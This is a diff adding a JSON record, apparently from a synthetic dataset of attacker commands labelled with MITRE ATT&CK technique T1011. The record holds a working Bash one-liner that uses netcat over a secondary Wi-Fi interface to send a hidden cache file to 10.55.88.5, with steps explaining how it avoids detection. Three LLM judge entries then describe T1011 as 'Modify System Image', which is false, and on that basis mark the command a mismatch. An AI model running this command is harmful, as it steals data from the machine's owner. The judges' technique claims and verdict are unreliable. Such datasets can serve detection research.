@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan1 >/dev/null 2>&1 && nc -u -w 2 -s \"$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)\" 10.55.88.5 49175 < /home/user/.cache/.tmp.bin",
+  "explanation": "Exfiltrates data via a secondary Wi\u2011Fi interface using UDP to an uncommon port, aligning with T1011 by using a network medium (wlan1) distinct from the primary channel. iwconfig is used for monitoring the interface before transmission.",
+  "rationale_steps": [
+    "Verify availability of the alternate Wi\u2011Fi interface with iwconfig (monitoring only).",
+    "Bind netcat to the wlan1 source IP to force traffic over the distinct Wi\u2011Fi medium.",
+    "Send the file over UDP to an uncommon port to reduce detection without changing system routes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-4aaad84e",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command chaining (&&), correct redirection (>/dev/null 2>&1, <), valid command substitution ($()), and appropriate quoting.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over a network interface, it doesn't actually modify system firmware/OS images as described in T1011 (Modify System Image) but instead aligns better with T1048 (Exfiltration Over Alternative Protocol).",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T19:54:45.821938Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax for all commands, flags, redirections, and command substitutions.",
+        "semantic_score": 1,
+        "semantic_justification": "While the command effectively exfiltrates data using UDP, it fundamentally misrepresents the MITRE ATT&CK T1011 technique, which involves modifying system images, not performing network exfiltration.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T19:55:00.684084Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting, proper redirections and pipes, and plausible flags for iwconfig, ip/awk, and nc.",
+        "semantic_score": 1,
+        "semantic_justification": "Per the provided technique description (Modify System Image), this command performs UDP data exfiltration and does not modify firmware/bootloaders or system images, so it is not aligned.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T19:56:22.284292Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
